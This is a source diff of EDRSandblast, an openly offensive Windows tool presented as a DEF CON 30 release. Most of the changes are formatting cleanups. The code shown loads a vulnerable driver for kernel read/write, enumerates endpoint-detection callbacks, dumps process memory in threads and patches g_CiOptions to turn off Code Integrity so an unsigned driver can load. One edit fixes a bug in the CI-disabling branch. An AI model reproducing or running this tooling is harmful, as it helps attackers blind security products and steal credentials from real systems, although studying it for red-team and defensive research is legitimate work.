@@ -53,11 +53,11 @@ typedef NTSTATUS(NTAPI* NtQueryInformationProcess_f)(
     );
 
 void PrintBanner() {
-    const TCHAR edrsandblast[] = TEXT("  ______ _____  _____   _____                 _ _     _           _   \r\n |  ____|  __ \\|  __ \\ / ____|               | | |   | |         | |  \r\n | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_ \r\n |  __| | |  | |  _  / \\___ \\ / _` | \'_ \\ / _` | \'_ \\| |/ _` / __| __|\r\n | |____| |__| | | \\ \\ ____) | (_| | | | | (_| | |_) | | (_| \\__ | |_ \r\n |______|_____/|_|  \\_|_____/ \\__,_|_| |_|\\__,_|_.__/|_|\\__,_|___/\\__|\n");   
+    const TCHAR edrsandblast[] = TEXT("  ______ _____  _____   _____                 _ _     _           _   \r\n |  ____|  __ \\|  __ \\ / ____|               | | |   | |         | |  \r\n | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_ \r\n |  __| | |  | |  _  / \\___ \\ / _` | \'_ \\ / _` | \'_ \\| |/ _` / __| __|\r\n | |____| |__| | | \\ \\ ____) | (_| | | | | (_| | |_) | | (_| \\__ | |_ \r\n |______|_____/|_|  \\_|_____/ \\__,_|_| |_|\\__,_|_.__/|_|\\__,_|___/\\__|\n");
     const TCHAR defcon[] = TEXT("D3FC0N 30 Edition");
     const TCHAR authors[2][256] = { TEXT("Thomas DIOT (@_Qazeer)"), TEXT("Maxime MEIGNAN (@th3m4ks)") };
-    
-    srand(time(NULL));
+
+    srand((unsigned int)time(NULL));
     int r = rand() % 2;
 
     _putts_or_not(edrsandblast);
@@ -334,7 +334,7 @@ Other options:\n\
     }
 
     // Command line option consistency checks.
-    if (startMode == none){
+    if (startMode == none) {
         _putts_or_not(TEXT("[!] You did not provide an action to perform: audit, dump, credguard or cmd"));
         return EXIT_FAILURE;
     }
@@ -440,7 +440,7 @@ Other options:\n\
         // Install the vulnerable driver to have read / write in Kernel memory.
         LPTSTR serviceNameIfAny = NULL;
         BOOL isDriverAlreadyRunning = IsDriverServiceRunning(driverPath, &serviceNameIfAny);
-        if (isDriverAlreadyRunning){
+        if (isDriverAlreadyRunning) {
             _putts_or_not(TEXT("[+] Vulnerable driver is already running!\n"));
             SetDriverServiceName(serviceNameIfAny);
         }
@@ -477,7 +477,7 @@ Other options:\n\
             isSafeToExecutePayloadKernelland = FALSE;
         }
         _putts_or_not(TEXT(""));
-        
+
         _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication..."));
         foundObjectCallbacks = EnumEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
         _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tObject callbacks are %s !\n"), foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
@@ -571,10 +571,10 @@ Other options:\n\
                 pThreatArguments[1] = outputPath;
 
                 if (directSyscalls) {
-                    hThread = CreateThread(NULL, 0, SandMiniDumpWriteDumpFromThread, (PVOID) pThreatArguments, 0, NULL);
+                    hThread = CreateThread(NULL, 0, SandMiniDumpWriteDumpFromThread, (PVOID)pThreatArguments, 0, NULL);
                 }
                 else {
-                    hThread = CreateThread(NULL, 0, dumpProcessFromThread, (PVOID) pThreatArguments, 0, NULL);
+                    hThread = CreateThread(NULL, 0, dumpProcessFromThread, (PVOID)pThreatArguments, 0, NULL);
                 }
                 if (hThread) {
                     WaitForSingleObject(hThread, INFINITE);
@@ -722,14 +722,14 @@ Other options:\n\
                     if (kernelMode) {
                         DWORD64 CiBaseAddress = 0;
                         DWORD64 g_CiOptionsAddress = 0;
-                        if (IsCiEnabled() | !IsCiEnabled()) // FIX IT !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+                        if (IsCiEnabled())
                         {
                             CiBaseAddress = FindCIBaseAddress(verbose);
                             if (!CiBaseAddress) {
                                 _putts_or_not(TEXT("[-] CI base address not found !\n"));
                             }
-                            else{
-                                g_CiOptionsAddress=CiBaseAddress + g_ciOffsets.st.g_CiOptions;
+                            else {
+                                g_CiOptionsAddress = CiBaseAddress + g_ciOffsets.st.g_CiOptions;
                                 if (verbose)
                                     _tprintf_or_not(TEXT("[+] CI.dll kernel base address found at 0x%llx. The g_CiOptions is at %llx !\n"), CiBaseAddress, g_CiOptionsAddress);
                                 if (_tcslen(unsignedDriverPath) == 0) {
@@ -741,7 +741,7 @@ Other options:\n\
                                     return EXIT_FAILURE;
                                 }
                                 _putts_or_not(TEXT("[+] Using the vulnerable driver to disable CI..."));  // debug print
-                                ULONG CiOptionsValue=0;
+                                ULONG CiOptionsValue = 0;
                                 PULONG OldCiOptionsValue;
                                 patch_gCiOptions(g_CiOptionsAddress, CiOptionsValue, &OldCiOptionsValue);
                                 LPTSTR evilServiceNameIfAny = NULL;
